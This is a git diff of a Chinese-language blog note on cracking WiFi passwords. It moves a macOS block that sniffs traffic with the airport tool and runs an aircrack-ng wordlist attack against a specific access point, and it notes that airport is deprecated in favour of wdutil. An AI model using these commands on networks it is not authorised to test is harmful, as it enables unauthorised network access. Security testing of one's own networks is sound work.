@@ -6,6 +6,7 @@ categories: ["code"]
 tags: 
 description: wifi-crack
 ---
+## 前言
 
 关于破解的方法和思路参考[渗透测试之构建高效WiFi破解字典](https://www.anquanke.com/post/id/219315)
 
@@ -14,6 +15,32 @@ description: wifi-crack
 - [bully](https://www.kali.org/tools/bully/)
 - [reaver](https://www.kali.org/tools/reaver/)
 - [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=install_aircrack#installing_on_mac_osx)
+
+
+## mac 自带的 wifi 扫描工具
+
+airport 为早期 os 版本自带工具
+```
+airport -s
+sudo rm -rf /tmp/airport*
+sudo airport en0 sniff 3
+ls -lh /tmp/airport*
+aircrack-ng -w top100.txt -M 100 -f 80 -1 -a 2 -b 0c:5c:b5:c8:04:eb /tmp/airportSniff*.cap
+```
+
+新版 macos 会提示
+```bash
+sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
+WARNING: The airport command line tool is deprecated and will be removed in a future release.
+For diagnosing Wi-Fi related issues, use the Wireless Diagnostics app or wdutil command line tool.
+```
+
+需要使用 wdutil 代替
+```bash?linenums
+sudo wdutil scan -i 5
+```
+> **较新的 macOS 版本**（Big Sur 之后），Apple 把 `wdutil` 的很多调试功能收缩了，只留下了日志、诊断、dump 等功能，**已经不能直接扫描 Wi-Fi**。
+
 
 
 ## mac 上安装 aircrack-ng
@@ -34,14 +61,6 @@ brew install autoconf automake libtool openssl shtool pkg-config hwloc pcre sqli
  ldconfig
 ```
 
-
-```
-airport -s
-sudo rm -rf /tmp/airport*
-sudo airport en0 sniff 3
-ls -lh /tmp/airport*
-aircrack-ng -w top100.txt -M 100 -f 80 -1 -a 2 -b 0c:5c:b5:c8:04:eb /tmp/airportSniff*.cap
-```
 
 ## 树莓派上安装 aircrack-ng
 
@@ -110,7 +129,9 @@ make install
 ldconfig
 ```
 
-使用Aircrack-ng工具，依次输入以下命令  
+## Aircrack-ng 使用
+
+使用Aircrack-ng工具，依次输入以下命令
 
 ```bash
 # 杀死占用网卡的进程  
